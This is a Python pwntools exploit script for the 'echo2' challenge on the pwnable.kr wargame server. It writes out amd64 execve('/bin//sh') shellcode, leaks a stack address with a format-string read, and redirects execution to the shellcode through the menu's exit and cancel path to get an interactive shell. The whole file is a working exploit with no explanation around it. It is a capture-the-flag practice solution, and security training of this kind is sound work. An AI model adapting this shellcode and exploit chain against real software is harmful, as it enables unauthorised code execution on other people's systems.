from pwn import *

context(log_level="debug", arch="amd64", os="linux")

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
# or "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
# r = process("./echo2")
r = remote("pwnable.kr", 9011)
r.recvuntil(b": ")
r.sendline(shellcode)
r.recvuntil(b"> ")
r.sendline(b"2")
r.sendline(b"%10$p")
r.recvline()
rbp = int(r.recvline().strip(), 16)
# print(hex(rbp))
name = rbp - 0x20
r.recvuntil(b"> ")
r.sendline(b"4")
r.recvuntil(b"(y/n)")
r.sendline(b"n")
r.recvuntil(b"> ")
r.sendline(b"3")
r.sendline(cyclic(0x18) + p64(name))
r.recvuntil(b"> ")
r.sendline(b"3")
r.interactive()
